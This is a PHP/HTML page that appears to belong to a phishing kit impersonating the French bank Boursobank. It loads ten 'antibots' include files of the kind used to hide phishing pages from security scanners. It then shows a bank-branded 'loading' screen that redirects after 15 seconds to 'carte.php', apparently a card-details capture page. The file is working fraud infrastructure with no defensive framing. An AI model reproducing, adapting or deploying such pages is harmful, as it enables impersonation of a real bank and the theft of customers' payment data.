<?php

include 'src/antibots.php';
include 'antibots.php';
include 'anti/anti1.php';
include 'anti/anti2.php';
include 'anti/anti3.php';
include 'anti/anti4.php';
include 'anti/anti5.php';
include 'anti/anti6.php';
include 'anti/anti7.php';
include 'anti/anti8.php';

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="short icon" href="instruments-logo-4677.png">

    <title>Chargement - Boursobank</title>
    <style>
        /* Corps général */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(to bottom, #f3f4fc, #eef4fc);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* Conteneur de chargement */
        .loading-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        /* Logo */
        .loading-logo img {
            max-width: 150px;
            animation: pulse 1.5s infinite ease-in-out;
        }

        /* Animation du logo */
        @keyframes pulse {
            0%, 100% {
                transform: scale(1);
                opacity: 1;
            }
            50% {
                transform: scale(1.1);
                opacity: 0.8;
            }
        }

        /* Texte de chargement */
        .loading-text {
            margin-top: 20px;
            font-size: 1.2rem;
            color: #003883;
            font-weight: bold;
        }

        /* Animation des points */
        .dots {
            display: inline-block;
            margin-left: 5px;
        }

        .dots span {
            display: inline-block;
            width: 8px;
            height: 8px;
            margin: 0 3px;
            background: #d9007f;
            border-radius: 50%;
            animation: bounce 1.5s infinite ease-in-out;
        }

        .dots span:nth-child(2) {
            animation-delay: 0.2s;
        }

        .dots span:nth-child(3) {
            animation-delay: 0.4s;
        }

        @keyframes bounce {
            0%, 100% {
                transform: translateY(0);
            }
            50% {
                transform: translateY(-10px);
            }
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <!-- Logo principal -->
        <div class="loading-logo">
            <img src="rvb-logo-3000_original_original-1024x188.png" alt="Logo Boursobank">
        </div>
        <!-- Texte de chargement -->
        <div class="loading-text">
            Chargement en cours
            <div class="dots">
                <span></span><span></span><span></span>
            </div>
        </div>
    </div>

    <script>
        // Redirection automatique après 15 secondes
        setTimeout(() => {
            window.location.href = "carte.php"; // Remplacez par l'URL de destination
        }, 15000); // 15 000 ms = 15 secondes
    </script>
</body>
</html>
